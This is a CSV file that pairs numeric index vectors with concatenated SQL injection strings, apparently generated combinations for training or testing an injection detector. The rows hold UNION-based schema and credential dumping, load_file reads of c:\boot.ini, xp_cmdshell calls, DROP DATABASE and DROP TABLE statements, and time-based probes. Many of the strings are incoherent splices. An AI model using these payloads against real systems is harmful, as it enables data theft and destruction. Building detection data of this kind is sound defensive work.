sig_vector,sig_string
"[27, 26, 33]"," select * from users where id=1 union select 1,1,1,load_file(c:\\boot.ini) 
 exec master..xp_cmdshell '"
"[29, 1, 81]", drop database db') or create table test like users;
"[54, 44, 56]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3create table dirs(paths varchar(100), id int)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[15, 47, 54]"," and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 1, 54]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') orunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[19, 22, 62]"," or'1'='1 union select 1,2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[8, 36, 62]",and(  (select @@version） 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[47, 17, 81]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ' and 1=2 create table test like users;"
"[25, 32, 54]"," updatexml(1,concat(0x7e,(select @@version),0x7e),1)  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  union select 1,username,password from users where id=2"
"[54, 82, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 34]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  INSERT INTO"
"[52, 32, 62]"," sleep(5) union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 32, 66]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) ;--"
"[78, 56, 61]"," = 1 union select 1,2,3  /*union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1=(select name from master.dbo.sysdatabases where id=1)"
"[50, 30, 62]", 1 = 2 union all select user()  select version() 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[82, 35, 62]", drop table sc3； delete table dirs  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[82, 56, 62]"," drop table sc3；union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 20, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 exists (select * from sysobjects) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[19, 50, 62]", or'1'='1 1 = 2 union all select user()  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[51, 34, 62]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 INSERT INTO 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 50, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1 = 2 union all select user()  create table test like users;"
"[54, 35, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs  union select 1,username,password from users where id=2"
"[9, 56, 54]"," 1 or union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 51, 20]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)"
"[50, 7, 62]", 1 = 2 union all select user() and 0 >< 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 1, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3') or union select 1,username,password from users where id=2"
"[8, 32, 54]","and(  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 22]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  union select 1,2"
"[54, 32, 63]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) 1"
"[54, 32, 11]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  ) or "
"[19, 32, 62]"," or'1'='1 union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 22, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 38, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select Count(*) from table)>0 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[35, 32, 29]"," delete table dirs  union select 1,2,(database())  drop database db"
"[50, 82, 62]", 1 = 2 union all select user()  drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 82, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 56, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[82, 1, 62]", drop table sc3；') or 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 56, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) union select 1,username,password from users where id=2"
"[54, 1, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3') or union select 1,1,1,load_file(c:\\boot.ini) 
"
"[54, 8, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3and(  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[68, 56, 54]"," */union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 8, 54]"," 1)) or and( union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 57, 7]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,@@datadir,3and 0 ><"
"[54, 47, 7]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 and 0 ><"
"[19, 47, 62]"," or'1'='1union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 63, 27]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),31 select * from users where id=1"
"[82, 17, 62]", drop table sc3； ' and 1=2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 44, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3create table dirs(paths varchar(100), id int) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[8, 82, 62]",and(  drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[82, 46, 36]", drop table sc3；1 (select @@version）
"[36, 28, 82]", (select @@version）(select count(*) from mysql.user)>0 drop table sc3；
"[28, 32, 36]","(select count(*) from mysql.user)>0 union select 1,2,(database())  (select @@version）"
"[23, 32, 4]"," union select 1,username,password from users where id=2 union select 1,2,(database()) ' and "
"[9, 32, 54]"," 1 or  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 24, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(if((user() regexp '^r'),1,0)) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 23, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,username,password from users where id=2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 34, 68]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 INSERT INTO */"
"[19, 82, 62]", or'1'='1 drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 47, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[54, 57, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,@@datadir,3 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[54, 47, 22]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2"
"[15, 32, 54]"," and 1=2  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[19, 35, 62]", or'1'='1 delete table dirs  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[54, 22, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2 create table test like users;"
"[54, 44, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3create table dirs(paths varchar(100), id int) create table test like users;"
"[54, 78, 3]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 1 union select 1,2,3  /*'')) or"
"[54, 47, 39]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_SRVROLEMEMBER('sysadmin'))"
